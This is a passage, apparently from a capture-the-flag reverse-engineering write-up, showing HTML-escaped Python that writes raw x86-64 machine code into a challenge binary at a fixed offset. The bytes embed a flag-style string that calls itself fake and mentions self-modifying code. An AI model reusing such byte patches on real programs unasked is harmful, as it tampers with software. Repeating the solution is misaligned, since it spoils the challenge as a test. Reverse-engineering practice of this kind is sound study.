data &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; fr&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;read()
fw&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(data)
fw&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;seek(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x1216&lt;/span&gt;)

fw&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xf3\x0f\x1e\xfa\x55\x48\x89\xe5\x48\x81\xec\x60\x01\x00\x00\x48&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; )
fw&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x89\xbd\x28\xfe\xff\xff\x48\x8d\x95\x50\xff\xff\xff\xb8\x00\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; )
fw&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00\x00\xb9\x12\x00\x00\x00\x48\x89\xd7\xf3\x48\xab\xc7\x85\xc0&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; )
fw&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xfe\xff\xff\xf6\xd6\x00\x00\xc7\x85\xc4\xfe\xff\xff\xa7\xee\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; )
fw&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00\xc7\x85\xc8\xfe\xff\xff\xf7\xea\x00\x00\xc7\x85\xcc\xfe\xff&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; )
fw&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xff\x9f\xdf\x00\x00\xc7\x85\xd0\xfe\xff\xff\xcc\xdd\x00\x00\xc7&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; )
fw&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x85\xd4\xfe\xff\xff\xae\xd9\x00\x00\xc7\x85\xd8\xfe\xff\xff\x32&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; )
fw&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xb6\x00\x00\xc7\x85\xdc\xfe\xff\xff\xc3\xce\x00\x00\xc7\x85\xe0&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; )
fw&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xfe\xff\xff\x4c\xd1\x00\x00\xc7\x85\xe4\xfe\xff\xff\x05\xc5\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; )
fw&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00\xc7\x85\xe8\xfe\xff\xff\x8e\xc3\x00\x00\xc7\x85\xec\xfe\xff&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; )
fw&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xff\x9a\xac\x00\x00\xc7\x85\xf0\xfe\xff\xff\x6d\xaf\x00\x00\xc7&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; )
fw&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x85\xf4\xfe\xff\xff\x9a\xb5\x00\x00\xc7\x85\xf8\xfe\xff\xff\xc8&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; )
fw&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xb3\x00\x00\xc7\x85\xfc\xfe\xff\xff\x3b\xad\x00\x00\xc7\x85\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; )
fw&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xff\xff\xff\x4a\xab\x00\x00\xc7\x85\x04\xff\xff\xff\x50\xad\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; )
fw&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00\xc7\x85\x08\xff\xff\xff\xce\xd6\x00\x00\xc7\x85\x0c\xff\xff&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; )
fw&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xff\xbc\xf1\x00\x00\xc7\x85\x10\xff\xff\xff\x12\xef\x00\x00\xc7&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; )
fw&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x85\x14\xff\xff\xff\x1b\xe3\x00\x00\xc7\x85\x18\xff\xff\xff\x82&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; )
fw&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xe1\x00\x00\xc7\x85\x1c\xff\xff\xff\xb4\xd6\x00\x00\xc7\x85\x20&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; )
fw&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xff\xff\xff\xd1\xbe\x00\x00\xc7\x85\x24\xff\xff\xff\x52\xc7\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; )
fw&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00\xc7\x85\x28\xff\xff\xff\xdd\xc1\x00\x00\xc7\x85\x2c\xff\xff&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; )
fw&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xff\x5b\xbc\x00\x00\xc7\x85\x30\xff\xff\xff\x20\xbb\x00\x00\xc7&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; )
fw&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x85\x34\xff\xff\xff\x87\xc6\x00\x00\xc7\x85\x38\xff\xff\xff\x04&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; )
fw&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xb6\x00\x00\xc7\x85\x3c\xff\xff\xff\x55\xc5\x00\x00\xc7\x85\x40&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; )
fw&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xff\xff\xff\x25\xbd\x00\x00\xc7\x85\x44\xff\xff\xff\x3f\xb4\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; )
fw&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00\xc7\x85\x48\xff\xff\xff\x16\xb4\x00\x00\xc7\x85\x4c\xff\xff&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; )
fw&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xff\x98\xb6\x00\x00\xc7\x85\x30\xfe\xff\xff\x68\x00\x00\x00\xc7&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; )
fw&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x85\x34\xfe\xff\xff\x67\x00\x00\x00\xc7\x85\x38\xfe\xff\xff\x61&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; )
fw&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00\x00\x00\xc7\x85\x3c\xfe\xff\xff\x6d\x00\x00\x00\xc7\x85\x40&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; )
fw&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xfe\xff\xff\x65\x00\x00\x00\xc7\x85\x44\xfe\xff\xff\x7b\x00\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; )
fw&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00\xc7\x85\x48\xfe\xff\xff\x40\x00\x00\x00\xc7\x85\x4c\xfe\xff&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; )
fw&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xff\x5f\x00\x00\x00\xc7\x85\x50\xfe\xff\xff\x46\x00\x00\x00\xc7&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; )
fw&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x85\x54\xfe\xff\xff\x41\x00\x00\x00\xc7\x85\x58\xfe\xff\xff\x4b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; )
fw&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00\x00\x00\xc7\x85\x5c\xfe\xff\xff\x45\x00\x00\x00\xc7\x85\x60&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; )
fw&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xfe\xff\xff\x5f\x00\x00\x00\xc7\x85\x64\xfe\xff\xff\x66\x00\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; )
fw&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00\xc7\x85\x68\xfe\xff\xff\x6c\x00\x00\x00\xc7\x85\x6c\xfe\xff&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; )
fw&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xff\x61\x00\x00\x00\xc7\x85\x70\xfe\xff\xff\x67\x00\x00\x00\xc7&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; )
fw&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x85\x74\xfe\xff\xff\x21\x00\x00\x00\xc7\x85\x78\xfe\xff\xff\x2d&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; )
fw&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00\x00\x00\xc7\x85\x7c\xfe\xff\xff\x64\x00\x00\x00\xc7\x85\x80&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; )
fw&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xfe\xff\xff\x6f\x00\x00\x00\xc7\x85\x84\xfe\xff\xff\x5f\x00\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; )
fw&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00\xc7\x85\x88\xfe\xff\xff\x59\x00\x00\x00\xc7\x85\x8c\xfe\xff&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; )
fw&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xff\x30\x00\x00\x00\xc7\x85\x90\xfe\xff\xff\x75\x00\x00\x00\xc7&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; )
fw&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x85\x94\xfe\xff\xff\x5f\x00\x00\x00\xc7\x85\x98\xfe\xff\xff\x6b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; )
fw&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00\x00\x00\xc7\x85\x9c\xfe\xff\xff\x6f\x00\x00\x00\xc7\x85\xa0&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; )
fw&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xfe\xff\xff\x6e\x00\x00\x00\xc7\x85\xa4\xfe\xff\xff\x77\x00\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; )
fw&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00\xc7\x85\xa8\xfe\xff\xff\x5f\x00\x00\x00\xc7\x85\xac\xfe\xff&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; )
fw&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xff\x53\x00\x00\x00\xc7\x85\xb0\xfe\xff\xff\x4d\x00\x00\x00\xc7&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; )
fw&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x85\xb4\xfe\xff\xff\x43\x00\x00\x00\xc7\x85\xb8\xfe\xff\xff\x3f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; )
fw&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00\x00\x00\xc7\x85\xbc\xfe\xff\xff\x7d\x00\x00\x00\xc7\x45\xfc&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; )
fw&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x01\x00\x00\x00\xc7\x45\xf8\x00\x00\x00\x00\xe9\xb9\x00\x00\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; )
fw&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xc7\x45\xf4\x00\x00\x00\x00\xe9\x9f\x00\x00\x00\xc7\x45\xf0\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; )
fw&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00\x00\x00\xe9\x85\x00\x00\x00\x8b\x55\xf8\x89\xd0\x01\xc0\x01&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; )
fw&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xd0\x01\xc0\x89\xc2\x8b\x45\xf4\x01\xd0\x48\x98\x8b\xb4\x85\x50&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; )
fw&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xff\xff\xff\x8b\x55\xf8\x89\xd0\x01\xc0\x01\xd0\x01\xc0\x89\xc2&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; )
fw&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x8b\x45\xf0\x01\xd0\x48\x98\x48\x8d\x14\x85\x00\x00\x00\x00\x48&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; )
fw&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x8b\x85\x28\xfe\xff\xff\x48\x01\xd0\x8b\x00\x89\xc1\x8b\x55\xf0&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; )
fw&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x89\xd0\x01\xc0\x01\xd0\x01\xc0\x89\xc2\x8b\x45\xf4\x01\xd0\x48&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; )
fw&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x98\x8b\x84\x85\x30\xfe\xff\xff\x0f\xaf\xc8\x8b\x55\xf8\x89\xd0&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; )
